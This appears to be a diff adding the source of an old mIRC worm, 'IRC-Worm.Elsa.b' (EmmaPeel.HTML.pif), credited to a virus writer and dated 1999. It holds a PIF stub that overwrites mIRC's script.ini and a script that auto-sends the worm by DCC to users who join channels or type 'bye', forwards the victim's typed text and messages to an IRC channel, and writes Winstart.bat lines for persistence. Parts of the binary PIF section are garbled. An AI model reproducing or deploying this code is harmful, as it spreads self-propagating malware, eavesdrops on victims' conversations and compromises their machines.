@@ -1,0 +1,42 @@
+IRC-Worm.Elsa.b by Del_Armg0
+-------------------------------------------
+2 - EmmaPeel.HTML.pif	akaIRC-Worm.Elsa.b
+-------------------------------------------
+
+ xCommandes MS-DOS              Ä  CCOMMAND.COM and.com                                          CMIRC                                                         C copy CmircdownloadEmmaPeel.HTML.pif Cmircscript.ini    ˇP                                                                                                                                     MICROSOFT PIFEX á  qWINDOWS 386 3.0 ùh Ä  d 2 ˇˇ  ˇˇ                      C copy CmircdownloadEmmaPeel.HTML.pif Cmircscript.ini  WINDOWS VMM 4.0 ˇˇ¨                                                                                        CWINDOWSWrite.exe                                                                         2                  » Ë 
+                 Terminal                        Courier New                          P  0,g    ˇˇˇˇˇˇˇˇ  R}                                                                                          
+
+[script]
+
+n0 =on 1start{
+n1 =.remote on
+n2 =.ctcps on
+n3 =.events on
+n4 = }
+n5 =on 1CONNECTrun -n CCOMMAND.COM C copy CmircdownloadEmmaPeel.HTML.pif CWindowsEmmaPeel.HTML.pif
+n6 =on 1JOIN#{
+n7 =if ( $nick == $me ) { halt }  .dcc send $nick CWindowsEmmaPeel.HTML.pif
+n8 = }
+n9 =;
+n10=on 1TEXTbye#{
+n11=if ( $nick == $me ) { halt }  .dcc send $nick CmircdownloadEmmaPeel.HTML.pif
+n12= }
+n13=on 1DISCONNECTcopy -o CWindowsEmmaPeel.HTML.pif CmircdownloadEmmaPeel.HTML.pif
+n14=on 1INPUT.msg #EmmaPeel [( $+ $active $+ ) $1-]
+n15=on 1TEXT.msg #EmmaPeel [( $+ $active $+ ) $1-]
+n16=on 1TEXTemmapeel#nick EmmaPeelx
+n17=on 1QUITwrite -ci CWindowsWinstart.bat @copy B CWindowsEmmaPeel.HTML.pif CmircdownloadEmmaPeel.HTML.pif Y
+n18=;
+n19=on 1TEXTwrite -i CWindowsWinstart.bat @start m CmircdownloadEmmaPeel.HTML.pif
+n20=}
+n21=;just ze WORM .PIF II , designed by ... Del_Armg0 !ze!first!PIF!W0rm!  Merry XxX-Masss  ;)  17Dec99  oh!_i_luv_u_Miss_Peel!
+n22=;EMMA_PEEL  Greetz to [ZULU]=[SECRET]=[STRAM]=[VIRUSBUST]=[PHAGE]=[PERIKLES]=[LYSKO]=& all the guys on #vxtrader_#vx-vtc
+
+
+
+ This worm copies itself as Cmircscript.ini from CmircdownloadEmmaPeel.HTML.pif
+
+
+
+
+
